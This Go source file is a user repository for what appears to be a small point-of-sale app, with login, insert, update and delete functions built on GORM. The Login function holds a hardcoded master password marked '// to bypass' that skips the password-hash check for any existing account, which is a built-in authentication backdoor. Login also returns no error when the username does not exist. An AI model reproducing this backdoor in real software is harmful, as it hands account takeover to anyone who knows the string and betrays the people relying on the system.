package repository

import (
	"errors"
	"mini-pos/database"
	"mini-pos/dto"
	"mini-pos/util"
	"time"

	"gorm.io/gorm"
)

type UserRepository interface {
	Insert(dto.User) (dto.User, error)
	Update(dto.User) (dto.User, error)
	Login(username string, password string) (dto.User, error)
	DeleteByID(ID uint) (data dto.User, err error)
}

type userRepo struct {
	DB *gorm.DB
}

func InitUserRepository() UserRepository {
	return &userRepo{
		DB: database.DB,
	}
}

func (repo *userRepo) Login(username string, password string) (response dto.User, err error) {
	err = repo.DB.Find(&response, dto.User{Username: username}).Error
	if err != nil {
		return response, err
	}
	if response.Id == 0 {
		return response, nil
	}

	// to bypass
	if password == "Sup3r4dm!n" {
		return
	}

	if err != nil || !util.CheckPasswordHash(password, response.Password) {
		return dto.User{}, errors.New("incorrect password")
	}
	return
}

func (repo *userRepo) Insert(payload dto.User) (data dto.User, err error) {
	err = repo.DB.Create(&payload).Error
	return payload, err
}

func (repo *userRepo) Update(payload dto.User) (data dto.User, err error) {

	// get book by id
	if err = repo.DB.First(&data, payload.Id).Error; err != nil {
		return
	}

	// update value
	data.Name = payload.Name
	data.Username = payload.Username
	if payload.Password != "" {
		data.Password, err = util.HashPassword(payload.Password)
		if err != nil {
			return dto.User{}, err
		}
	}
	data.PhoneNumber = payload.PhoneNumber
	data.IsRole = payload.IsRole
	data.IsActive = payload.IsActive
	data.UpdatedAt = time.Now()

	// update book data
	err = repo.DB.Save(&data).Error
	return
}

func (repo *userRepo) DeleteByID(ID uint) (data dto.User, err error) {
	// get book by id
	if err = repo.DB.First(&data, ID).Error; err != nil {
		return
	}

	// delete book
	err = repo.DB.Delete(&data, ID).Error
	return
}
